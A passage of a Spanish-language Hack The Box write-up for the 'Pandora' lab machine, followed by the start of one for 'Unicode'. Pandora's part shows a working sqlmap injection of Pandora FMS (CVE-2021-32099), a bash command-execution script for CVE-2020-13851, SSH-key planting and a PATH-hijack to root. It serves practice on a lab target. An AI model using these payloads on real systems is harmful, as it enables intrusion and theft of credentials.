snmpd /usr/sbin/snmpd -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid Shell Tras utilizar estas credenciales por SSH logramos acceder a la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 π ~/htb/pandora ❯ ssh daniel@10.10.11.136 # HotelBabylon23 daniel@10.10.11.136\u0026#39;s password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun 30 Jan 03:05:15 UTC 2022 System load: 0.17 Processes: 244 Usage of /: 75.4% of 4.87GB Users logged in: 1 Memory usage: 23% IPv4 address for eth0: 10.10.11.136 Swap usage: 0% =\u0026gt; /boot is using 91.8% of 219MB 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Jan 30 00:09:24 2022 from 10.10.14.11 daniel@pandora:~$ whoami; id; pwd daniel uid=1001(daniel) gid=1001(daniel) groups=1001(daniel) /home/daniel daniel@pandora:~$ Pandora FMS Tras enumerar los procesos vemos que uno de ellos ejecutado por el usuario root toma las credenciales de daniel.\n1 2 3 4 5 6 7 8 9 daniel@pandora:~$ ps -ef|grep root [.. snip ..] root 1112 857 0 04:20 ? 00:00:00 /usr/bin/host_check -u daniel -p HotelBabylon23 daniel 1273 1255 0 04:20 pts/0 00:00:00 grep --color=auto root daniel@pandora:~$ ps -ef|grep host root 857 819 0 04:19 ? 00:00:00 /bin/sh -c sleep 30; /bin/bash -c \u0026#39;/usr/bin/host_check -u daniel -p HotelBabylon23\u0026#39; root 1112 857 0 04:20 ? 00:00:00 /usr/bin/host_check -u daniel -p HotelBabylon23 daniel 1275 1255 0 04:20 pts/0 00:00:00 grep --color=auto host daniel@pandora:~$ Revisamos host_check, observamos que es un ejecutable.\n1 2 3 4 5 daniel@pandora:~$ ls -lah /usr/bin/host_check -rwxr-xr-x 1 root root 17K Jun 17 2021 /usr/bin/host_check daniel@pandora:~$ file /usr/bin/host_check /usr/bin/host_check: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c1405fc37fbf335b24d79d20f99671c9b2395cac, for GNU/Linux 3.2.0, not stripped daniel@pandora:~$ En la maquina no existe el comando strings, localmente ejecutamos strings al ejecutable, vemos que realiza una consulta utilizando curl a una dirección local con las credenciales como parametro.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 π ~/htb/pandora ❯ strings host_check [.. snip ..] _ITM_registerTMCloneTable u/UH []A\\A]A^A_ PandoraFMS host check utility Now attempting to check PandoraFMS registered hosts. Files will be saved to ~/.host_check /usr/bin/curl \u0026#39;http://127.0.0.1/pandora_console/include/api.php?op=get\u0026amp;op2=all_agents\u0026amp;return_type=csv\u0026amp;other_mode=url_encode_separator_%7C\u0026amp;user=daniel\u0026amp;pass=HotelBabylon23\u0026#39; \u0026gt; ~/.host_check 2\u0026gt;/dev/null Host check unsuccessful! Please check your credentials. Terminating program! Host check successful! Terminating program! Ussage: ./host_check -u username -p password. Two arguments expected. ;*3$\u0026#34; GCC: (Debian 10.2.1-6) 10.2.1 20210110 [.. snip ..] .data .bss .comment π ~/htb/pandora ❯ Esta consulta nos devuelve información, la versión: Pandora FMS Version 7.0NG.742_FIX_PERL2020.\n1 2 3 4 daniel@pandora:~$ /usr/bin/curl \u0026#39;http://127.0.0.1/pandora_console/include/api.php?op=get\u0026amp;op2=all_agents\u0026amp;return_type=csv\u0026amp;other_mode=url_encode_separator_%7C\u0026amp;user=daniel\u0026amp;pass=HotelBabylon23\u0026#39; 1;localhost.localdomain;192.168.1.42;Created by localhost.localdomain;Linux;;09fbaa6fdf35afd44f8266676e4872f299c1d3cbb9846fbe944772d913fcfc69;3 2;localhost.localdomain;;Pandora FMS Server version 7.0NG.742_FIX_PERL2020;Linux;;localhost.localdomain;3 daniel@pandora:~ Únicamente puede ser accedida localmente, además el usuario que esta \u0026rsquo;ejecutando\u0026rsquo; este sitio es matt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 daniel@pandora:~$ curl -s http://127.0.0.1/pandora_console/|head \u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD XHTML 1.0 Transitional//EN\u0026#34; \u0026#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\u0026#34;\u0026gt; \u0026lt;html xmlns=\u0026#34;http://www.w3.org/1999/xhtml\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Pandora FMS - the Flexible Monitoring System\u0026lt;/title\u0026gt; \u0026lt;meta http-equiv=\u0026#34;expires\u0026#34; content=\u0026#34;never\u0026#34; /\u0026gt; \u0026lt;meta http-equiv=\u0026#34;content-type\u0026#34; content=\u0026#34;text/html; charset=utf-8\u0026#34; /\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Style-Type\u0026#34; content=\u0026#34;text/css\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;resource-type\u0026#34; content=\u0026#34;document\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;distribution\u0026#34; content=\u0026#34;global\u0026#34; /\u0026gt; (23) Failed writing body daniel@pandora:~$ ls /etc/apache2/sites-available/ 000-default.conf default-ssl.conf pandora.conf daniel@pandora:~$ cat /etc/apache2/sites-available/pandora.conf \u0026lt;VirtualHost localhost:80\u0026gt; ServerAdmin admin@panda.htb ServerName pandora.panda.htb DocumentRoot /var/www/pandora AssignUserID matt matt \u0026lt;Directory /var/www/pandora\u0026gt; AllowOverride All \u0026lt;/Directory\u0026gt; ErrorLog /var/log/apache2/error.log CustomLog /var/log/apache2/access.log combined \u0026lt;/VirtualHost\u0026gt; daniel@pandora:~$ Utilizamos SSH para obtener el puerto 80 localmente, verificamos con netsat.\n1 2 3 4 5 6 7 8 9 10 11 12 # SSH Puerto 80 sudo ssh -L 80:127.0.0.1:80 daniel@pandora.htb # HotelBabylon23 # netstat π ~/htb/pandora ❯ sudo netstat -ntpl Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:80 0.0.0.0:* LISTEN 3168/ssh tcp6 0 0 127.0.0.1:41431 :::* LISTEN 1242/java tcp6 0 0 ::1:80 :::* LISTEN 3168/ssh tcp6 0 0 127.0.0.1:8080 :::* LISTEN 1242/java π ~/htb/pandora ❯ Vemos el login de Pandora y en el footer la version: v7.0NG.742_FIX_PERL2020.\nTras intentar ingresar con las credenciales nos muestra que el usuario unicamente puede utilizar la API.\nSQL Injection Vemos multiples vulnerabilidades y exploits con searchsploit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 π ~/htb/pandora ❯ searchsploit Pandora 7 -------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------------------------- --------------------------------- Pandora 7.0NG - Remote Code Execution | php/webapps/47898.py Pandora Fms - Remote Code Execution (Metasploit) | linux/remote/31518.rb [.. snip ..] Pandora FMS 7.0 NG 749 - \u0026#39;CG Items\u0026#39; SQL Injection (Authenticated) | php/webapps/49046.txt Pandora FMS 7.0 NG 749 - Multiple Persistent Cross-Site Scripting Vulnerabilities | php/webapps/49139.txt Pandora FMS 7.0 NG 750 - \u0026#39;Network Scan\u0026#39; SQL Injection (Authenticated) | php/webapps/49312.txt Pandora FMS 7.0NG - \u0026#39;net_tools.php\u0026#39; Remote Code Execution | php/webapps/48280.py [.. snip ..] PANDORAFMS 7.0 - Authenticated Remote Code Execution | php/webapps/48064.py PandoraFMS 7.0 NG 746 - Persistent Cross-Site Scripting | php/webapps/48707.txt PandoraFMS NG747 7.0 - \u0026#39;filename\u0026#39; Persistent Cross-Site Scripting | php/webapps/48700.txt [.. snip ..] --------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results π ~/htb/pandora ❯ Además vemos un post Pandora FMS 742: Critical Code Vulnerabilities Explained donde explican una vulnerabilidad de SQL Injection (CVE-2021-32099). El parametro session_id en /include/chart_generator.php es donde se encuentra esta vulnerabilidad, utilizamos sqlmap para explotarla, logramos listar las bases de datos y algunos hashes.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 π ~/htb/pandora ❯ sqlmap -u \u0026#34;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=0\u0026#34; -p \u0026#34;session_id\u0026#34; --batch --dbs ___ __H__ ___ ___[\u0026#39;]_____ ___ ___ {1.5.8#stable} |_ -| . [\u0026#39;] | .\u0026#39;| . | |___|_ [.]_|_|_|__,| _| |_|V... |_| http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 03:35:48 /2022-01-30/ [03:35:48] [INFO] resuming back-end DBMS \u0026#39;mysql\u0026#39; [03:35:48] [INFO] testing connection to the target URL [03:35:48] [WARNING] potential permission problems detected (\u0026#39;Access denied\u0026#39;) you have not declared cookie(s), while server wants to set its own (\u0026#39;PHPSESSID=49h82n6fl3a...e1lh0erc14\u0026#39;). Do you want to use those [Y/n] Y sqlmap resumed the following injection point(s) from stored session: --- Parameter: session_id (GET) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) Payload: session_id=-1919\u0026#39; OR 3360=3360# Type: error-based Title: MySQL \u0026gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: session_id=123\u0026#39; OR (SELECT 5135 FROM(SELECT COUNT(*),CONCAT(0x71706b7071,(SELECT (ELT(5135=5135,1))),0x7162707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- RrkX Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: session_id=123\u0026#39; AND (SELECT 8279 FROM (SELECT(SLEEP(5)))JNxp)-- LEOI --- [03:35:48] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu 20.04 or 19.10 (eoan or focal) web application technology: PHP, Apache 2.4.41 back-end DBMS: MySQL \u0026gt;= 5.0 (MariaDB fork) [03:35:48] [INFO] fetching database names [03:35:48] [INFO] resumed: \u0026#39;information_schema\u0026#39; [03:35:48] [INFO] resumed: \u0026#39;pandora\u0026#39; available databases [2]: [*] information_schema [*] pandora Sin embargo los hashes no se encuentran en servicios online como crackstation.net o el wordlist rockyou.txt.\n1 2 3 4 5 6 7 8 9 10 11 # sqlmap -u \u0026#34;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=0\u0026#34; -p \u0026#34;session_id\u0026#34; --batch -D pandora -T tusuario -C email,firstname,lastname,fullname,id_user,is_admin,password --dump Database: pandora Table: tusuario [3 entries] +--------------------+-----------+----------+---------------+---------+----------+----------------------------------+ | email | firstname | lastname | fullname | id_user | is_admin | password | +--------------------+-----------+----------+---------------+---------+----------+----------------------------------+ | admin@pandora.htb | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | Pandora Admin | admin | 1 | ad3f741b04bd5880fb32b54bc4f43d6a | | daniel@pandora.htb | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | Daniel | daniel | 0 | 76323c174bd49ffbbdedf678f6cc89a6 | | matt@pandora.htb | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | Matt | matt | 0 | f655f807365b6dc602b31ab3d6d43acc | +--------------------+-----------+----------+---------------+---------+----------+----------------------------------+ Además el único privilegio del usuario actual es USAGE.\n1 2 3 database management system users privileges: [*] \u0026#39;pandora\u0026#39;@\u0026#39;localhost\u0026#39; [1]: privilege: USAGE En el post menciona que se puede obtener acceso como administrador cargando el ID de este, aunque tras realizar distintos querys manualmente no logramos obtener acceso.\nThis way, any user can be impersonated including an administrator with full access privileges by loading its user ID. As a result, the SQL Injection can be used to authenticate as any user.\nDentro de la base de datos existen tablas que contienen información de la sesion de los usuarios.\n1 2 3 4 5 6 7 8 9 Database: pandora [178 tables] +------------------------------------+ [.. snip ..] | tsesion | | tsesion_extended | | tsessions_php | [.. snip ..] +------------------------------------+ En la tabla tsessions_php podemos listar informacion de las sesiones o cookies, pero, la cantidad de datos es muy alta.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Database: pandora Table: tsessions_php [3 columns] +-------------+----------+ | Column | Type | +-------------+----------+ | data | text | | id_session | char(52) | | last_active | int(11) | +-------------+----------+ +---------------+---------+ | Table | Entries | +---------------+---------+ | tsessions_php | 2374 | +---------------+---------+ Si hacemos \u0026lsquo;dump\u0026rsquo; a esta tabla vemos que en la columna \u0026ldquo;data\u0026rdquo; se encuentra el id_usuario.\n1 2 3 4 5 6 7 8 9 +----------------------------+------------------------------------------------------+-------------+ | id_session | data | last_active | +----------------------------+------------------------------------------------------+-------------+ [03:00:47] [WARNING] console output will be trimmed to last 256 rows due to large table size | 6talkd9q90r2n4mirsf84o7i8l | NULL | 1643412428 | | 6vioehueu55qfihb5gp5r37jb8 | NULL | 1643412425 | | 6vresof3vasfvhfkvvbeiabs8l | id_usuario|s:6:\u0026#34;daniel\u0026#34;; | 1643412391 | | 70gjpanmgukjrr5kql0m0m0g27 | NULL | 1643413936 | [.. snip ..] Tomando en cuenta esto utilizamos sql-shell de sqlmap para obtener una cookie valida para el usuario admin.\n1 2 3 4 5 6 7 8 9 10 11 sql-shell\u0026gt; select id_session,data from tsessions_php WHERE data like \u0026#39;%dmin%\u0026#39;; [03:05:49] [INFO] fetching SQL SELECT statement query output: \u0026#39;select id_session,data from tsessions_php WHERE data like \u0026#39;%dmin%\u0026#39;\u0026#39; [03:05:49] [INFO] resumed: \u0026#39;047ikbouedt2ln7me8hihc94uu\u0026#39; [03:05:49] [INFO] resumed: \u0026#39;id_usuario|s:5:\u0026#34;admin\u0026#34;;alert_msg|a:0:{}new_chat|b:0;\u0026#39; [03:05:49] [INFO] resumed: \u0026#39;h131lluncrclh2cdh4p6g2uq20\u0026#39; [03:05:49] [INFO] resumed: \u0026#39;id_usuario|s:5:\u0026#34;admin\u0026#34;;\u0026#39; select id_session,data from tsessions_php WHERE data like \u0026#39;%dmin%\u0026#39; [2]: [*] 047ikbouedt2ln7me8hihc94uu, id_usuario|s:5:\u0026#34;admin\u0026#34;;alert_msg|a:0:{}new_chat|b:0; [*] h131lluncrclh2cdh4p6g2uq20, id_usuario|s:5:\u0026#34;admin\u0026#34;; sql-shell\u0026gt; Utilizando esta cookie logramos obtener acceso como admin en Pandora.\nUser - Matt RCE En el post se menciona que realizando bypass es suficiente para ejecutar comandos y hace referencia a CVE-2020-13851.\n\u0026hellip; In the end, a login bypass is sufficient for an attacker because as an administrator there are already possibilities to execute code (also see CVE-2020-13851).\nEscribimos un pequeño script en bash tomando en cuenta el CVE que ejecuta comandos en la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 #!/bin/bash echo -n \u0026#34;Enter a cookie:\u0026#34; read cookie while : do echo -n \u0026#34;cmd\u0026gt; \u0026#34; read cmd if [ \u0026#34;$cmd\u0026#34; = \u0026#34;exit\u0026#34; ]; then exit; fi curl -X POST \u0026#34;http://127.0.0.1/pandora_console/ajax.php?sec=eventos\u0026amp;sec2=operation/events/events\u0026#34; -H \u0026#34;Content-Type: application/x-www-form-urlencoded; charset=UTF-8\u0026#34; -H \u0026#34;Refer: http://127.0.0.1/pandora_console/index.php\u0026#34; -H \u0026#34;Cookie: PHPSESSID=$cookie\u0026#34; -d \u0026#34;page=include/ajax/events\u0026amp;perform_event_response=10000000\u0026amp;target=$cmd\u0026amp;response_id=1\u0026#34; done Tras ejecutar el script logramos obtener acceso a la maquina como matt.\n1 2 3 4 5 6 7 8 π ~/htb/pandora ❯ ./pandora.sh Enter a cookie:047ikbouedt2ln7me8hihc94uu cmd\u0026gt; whoami;id matt uid=1000(matt) gid=1000(matt) groups=1000(matt) cmd\u0026gt; pwd /var/www/pandora/pandora_console cmd\u0026gt; Shell Agregamos la clave publica del usuario daniel al archivo authorized_keys de matt para acceder por SSH a este usuario.\n1 2 3 4 5 cmd\u0026gt; mkdir -p /home/matt/.ssh cmd\u0026gt; echo \u0026#34;ssh%2Drsa[.. snip ..]2BbLpHfxWWee4QQhzU%3D%20daniel%40pandora\u0026#34; \u0026gt; /home/matt/.ssh/authorized_keys cmd\u0026gt; cat /home/matt/.ssh/authorized_keys ssh-rsa A[.. snip ..]+bLpHfxWWee4QQhzU= daniel@pandora cmd\u0026gt; Finalmente accedimos por SSH logrando obtener la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 daniel@pandora:~$ ssh matt@localhost Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 1 Feb 03:53:38 UTC 2022 System load: 0.0 Processes: 241 Usage of /: 63.0% of 4.87GB Users logged in: 1 Memory usage: 8% IPv4 address for eth0: 10.10.11.136 Swap usage: 0% =\u0026gt; /boot is using 91.8% of 219MB 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. matt@pandora:~$ ls user.txt matt@pandora:~$ cat user.txt 3634ef5ba024e7a2e8ad08a9f01635bd matt@pandora:~$ Privesc Listando ficheros suid vemos pandora_backup.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 matt@pandora:~$ find / -perm -4000 2\u0026gt;/dev/null|xargs ls -lah -rwsr-sr-x 1 daemon daemon 55K Nov 12 2018 /usr/bin/at -rwsr-xr-x 1 root root 84K Jul 14 2021 /usr/bin/chfn -rwsr-xr-x 1 root root 52K Jul 14 2021 /usr/bin/chsh -rwsr-xr-x 1 root root 39K Mar 7 2020 /usr/bin/fusermount -rwsr-xr-x 1 root root 87K Jul 14 2021 /usr/bin/gpasswd -rwsr-xr-x 1 root root 55K Jul 21 2020 /usr/bin/mount -rwsr-xr-x 1 root root 44K Jul 14 2021 /usr/bin/newgrp -rwsr-x--- 1 root matt 17K Dec 3 15:58 /usr/bin/pandora_backup -rwsr-xr-x 1 root root 67K Jul 14 2021 /usr/bin/passwd -rwsr-xr-x 1 root root 31K May 26 2021 /usr/bin/pkexec -rwsr-xr-x 1 root root 67K Jul 21 2020 /usr/bin/su -rwsr-xr-x 1 root root 163K Jan 19 2021 /usr/bin/sudo -rwsr-xr-x 1 root root 39K Jul 21 2020 /usr/bin/umount -rwsr-xr-- 1 root messagebus 51K Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 15K Jul 8 2019 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 463K Jul 23 2021 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 23K May 26 2021 /usr/lib/policykit-1/polkit-agent-helper-1 matt@pandora:~$ Vemos que es un ejecutable y realiza un \u0026lsquo;backup\u0026rsquo; de \u0026lsquo;/var/www/pandora/pandora_console/\u0026rsquo; segun el output.\n1 2 3 4 5 6 7 8 9 10 11 matt@pandora:~$ file /usr/bin/pandora_backup /usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7174c3b04737ad11254839c20c8dab66fce55af8, for GNU/Linux 3.2.0, not stripped matt@pandora:~$ /usr/bin/pandora_backup \u0026gt; out.txt tar: Removing leading `/\u0026#39; from member names tar: Removing leading `/\u0026#39; from hard link targets matt@pandora:~$ cat out.txt |grep -v var PandoraFMS Backup Utility Now attempting to backup PandoraFMS client Backup successful! Terminating program! matt@pandora:~$ Localmente ejecutamos strings sobre este archivo, vemos que utiliza tar para comprimir la carpeta.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/pandora ❯ strings pandora_backup [.. snip ..] []A\\A]A^A_ PandoraFMS Backup Utility Now attempting to backup PandoraFMS client tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/* Backup failed! Check your permissions! Backup successful! Terminating program! [.. snip ..] .comment π ~/htb/pandora ❯ tar no muestra su directorio completo por lo que podriamos realizar PATH Hijacking. Creamos el archivo tar, agregamos bash dentro, hacemos ejecutable el archivo y finalmente modificamos la variable PATH.\n1 2 3 4 matt@pandora:~$ touch tar matt@pandora:~$ echo \u0026#34;/bin/bash\u0026#34; \u0026gt; tar matt@pandora:~$ chmod +x tar matt@pandora:~$ export PATH=.:$PATH Tras ejecutar el fichero logramos obtener una shell como root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 matt@pandora:~$ /usr/bin/pandora_backup PandoraFMS Backup Utility Now attempting to backup PandoraFMS client root@pandora:~# whoami; id root uid=0(root) gid=1000(matt) groups=1000(matt) root@pandora:~# cd /root root@pandora:/root# ls root.txt root@pandora:/root# cat root.txt 150a3751f50bf86fecd20f8a5d0e20d8 root@pandora:/root# ","description":"Pandora expone snmp, servicio por el cual obtuvimos credenciales y acceso por SSH. Encontramos una version de Pandora FMS vulnerable a SQLi, la cual nos permitió obtener privilegios de admin y posteriormente acceso a un segundo usuario. Finalmente escalamos privilegios tras realizar Path Hijacking.","id":27,"section":"posts","tags":["snmp","snmp-check","pandora fms","sqli","rce","tar","suid","path-hijacking"],"title":"Hack The Box - Pandora","uri":"https://sckull.github.io/posts/pandora/"},{"content":"\rUnicode presenta un sitio web donde obtuvimos acceso modificando un token JWT, para luego realizar Path Traversal utilizando caracteres Unicode lo que nos permitio acceder al codigo fuente y a la máquina. Finalmente escalamos privilegios obteniendo el codigo fuente de un fichero en python y realizando \u0026lsquo;bypass\u0026rsquo;.\nNombre Unicode OS Linux Puntos 30 Dificultad Media IP 10.10.11.126 Maker webspl01t3r\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.7, 5.3, 4.7, 5.3, 4.7],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[9, 8, 1, 9, 2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 # Nmap 7.91 scan initiated Sun Nov 28 22:52:24 2021 as: nmap -sS -p- --open -Pn --min-rate 3000 -o nmap 10.10.11.126 Nmap scan report for 10.10.11.126 (10.10.11.126) Host is up (0.13s latency). Not shown: 36823 closed ports, 28710 filtered ports Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Sun Nov 28 22:53:02 2021 -- 1 IP address (1 host up) scanned in 38.76 seconds Web Site El sitio web presenta un botton el cual redirige hacia google.com vemos que es un redireccionamiento por medio de: /redirect/?url=google.com. Además vemos dos direcciones de Login y Register.\nLa direccion del Login presenta un formulario para el ingreso de usuarios.\nRegister muestra un formulario de registro de usuarios.\nAuth - User Tras registrar un usuario e ingresar, vemos un dashboard con multiples opciones. Observamos en el footer que el sitio esta \u0026ldquo;desarrollado\u0026rdquo; con Flask.\nEn la opción Buy Now presenta un formluario que tras llenarlo nos redirige hacia una página donde muestra un mensaje, aunque no envia ningun tipo de dato al servidor. Upload a Threat Report permite subir unicamente documentos: .pdf y .doc, segun el formulario. 1 2 3 4 \u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;threat_report\u0026#34; accept=\u0026#34;.pdf\u0026#34; accept=\u0026#34;.doc\u0026#34; placeholder=\u0026#34;Upload a threat report\u0026#34; \u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; Tras enviar un documento muestra un mensaje igual al de Buy Now, y no muestra algun directorio donde el archivo fue subido.\nDirectory Brute Forcing Ejecutamos feroxbuster para busqueda de alguna direcci+on donde se muestren los archivos subidos. Vemos multiples direcciones nuevas,\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 π ~/htb/unicode ❯ feroxbuster -u http://10.10.11.126 -w $MD --depth 1 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.11.126 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── WLD 515l 959w 9294c Got 200 for http://10.10.11.126/0767de18e01d42a7863c5c8df86de1c8 (url length: 32) WLD - - - Wildcard response is static; auto-filtering 9294 responses; toggle this behavior by using --dont-filter WLD 515l 959w 9294c Got 200 for http://10.10.11.126/34abe8d47693416083b09823c08d9a41d51029dde825409b91041f4b13f936ff3794bbd6910b4ed49c61c3bae402e750 (url length: 96) 308 4l 24w 258c http://10.10.11.126/login 308 4l 24w 264c http://10.10.11.126/register 308 4l 24w 260c http://10.10.11.126/upload 308 4l 24w 264c http://10.10.11.126/redirect 308 4l 24w 262c http://10.10.11.126/display 308 4l 24w 262c http://10.10.11.126/pricing 308 4l 24w 260c http://10.10.11.126/logout 308 4l 24w 264c http://10.10.11.126/checkout 308 4l 24w 258c http://10.10.11.126/error 308 4l 24w 266c http://10.10.11.126/dashboard 308 4l 24w 264c http://10.10.11.126/internal 308 4l 24w 258c http://10.10.11.126/debug [####################] - 52m 220545/220545 0s found:14 errors:6 [####################] - 52m 220547/220545 69/s http://10.10.11.126 /display , redirige hacia una pagina donde muestra: unauthorise_.attempt = true;, /internal , muestra NoneType: None. /debug , muestra codigo 502. Json Web Token En los Headers del sitio encontramos un Json Web token.\n1 2 3 4 5 6 7 8 9 GET /dashboard/ HTTP/1.1 Host: 10.10.11.126 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: 